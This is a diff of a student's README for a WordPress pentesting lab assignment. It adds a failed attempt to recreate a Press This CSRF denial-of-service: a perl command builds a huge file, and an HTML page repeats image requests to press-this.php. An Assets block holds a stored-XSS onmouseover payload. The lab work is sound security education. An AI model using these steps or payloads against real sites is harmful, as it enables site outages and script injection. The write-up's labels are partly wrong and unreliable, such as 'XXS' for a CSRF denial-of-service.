@@ -1,6 +1,8 @@
 # Project 7 - WordPress Pentesting
 
-Time spent: **15** hours spent in total
+Time spent: **10* hours spent in total
+
+5 for setup, 5 for expoiting
 
 > Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress
 
@@ -56,16 +58,35 @@ Time spent: **15** hours spent in total
   - [ ] Affected source code:
     - MySQL database up to v.5.5.41
 
-
+4. Press This CSRF DoS **(ATTEMPTED:FAILED)**
+  - [ ] Summary: Creating a file on a secondary server and sending a link to the admin account crashes their WP site. This can be done in the comments to ensure that they are logged in. The file has commands that (if repeated enough) will DDoS the site and bring it down for a while trying to complete the URL command. 
+    - Vulnerability types: XXS
+    - Tested in version: 4.2
+    - Fixed in version: 4.2.13
+  - [ ] GIF Walkthrough: none; all attempts unsuccessful
+  - [ ] Steps to recreate:
+  -On an external server, create a large text file with the command:
+perl -e 'print "<>"x28000000' > foo.txt
+- Next, create a file called dos.html on the external server with enough
+entries to fill the connection pool of the WordPress server, as follows:
+```
+<img src='http://<wp
+server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
+server>%2Ffoo.txt&url-scan-submit=Scan&a=b'>
+```
+- [repeat as many times as preferrerd]
+- (replace <wp server> with the WordPress server address and <external
+server> with the external server)
+- Now have a logged in admin visit dos.html. The server will be down for a
+while.
+  
+  
+  [ ] Affected source code: entire site crash
 ## Assets
 ```
 <a title='x onmouseover=alert(unescape(/gawt%20hahkd/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[a whole lot of these]..AAA'></a>
 ```
- 
-+ script
 
-+ script
-  
 
 ## Resources
 
@@ -76,8 +97,9 @@ GIFs created with [LiceCap](http://www.cockos.com/licecap/).
 
 ## Notes
 
-Understanding how to correctly initiate and manage the vagrant framework was a big challenge. Now that i know how it works, it seems like very powerful tool that i can imagine security researchers clamor for. 
-
+- [ ] Troubles: 
+  - Understanding how to correctly initiate and manage the vagrant framework was a big challenge. Now that i know how it works, it seems like very powerful tool that i can imagine security researchers clamor for. 
+  - Attempting the CSRF DDoS was difficult. I have not spend enough time in 'hacker' mode to understand how, why, and when certain actions work. I was unsure why perl was required to pull off the file creation. Further, I could not get an effective link to publish. By that I mean I DID publish a link to the page, but the link was inneffective. I think the creation of it was incorrect, but I ran out of time trying to figure it out. 
 
 
 ## License
